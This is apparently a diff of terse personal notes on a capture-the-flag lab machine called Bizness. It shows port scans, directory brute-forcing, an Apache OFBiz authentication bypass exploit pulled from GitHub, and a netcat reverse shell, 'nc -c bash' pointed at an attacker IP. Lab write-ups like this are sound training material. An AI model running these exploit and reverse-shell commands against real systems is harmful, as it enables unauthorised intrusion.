@@ -1,4 +1,5 @@
 ## Machine Bizness
+
 ```sh
 nmap -p- -sV -sC --min-rate=100000 10.129.202.3
 nmap -p- -sV -sC --min-rate=100000 10.129.202.3 --script vuln
@@ -8,11 +9,13 @@ sqlmap -u "https://bizness.htb/"
 #that seems to be only a possible ddos chance
 sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://bizness.htb/
 #gobuster didnt worked
-#so i used dirbuster
+#so i used dirbuster (GUI
 #and found https://bizness.htb/control/login
 #Here I could see its Apache OFBiz used
 #Which is exploitable iI searched a bit for and easy to use exploit and found this:
-# https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass?trk=article-ssr-frontend-pulse_little-text-block&source=post_page-----b5bed59a7598--------------------------------
+# https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
+git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
+# and used it, just forgot to write the commands
 nc -lvnp 8001 # started listener
 python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash 10.10.14.190 8001' #and executed the exploit this gives a sehll
 cat /home/ofbiz/user.txt  #on target server
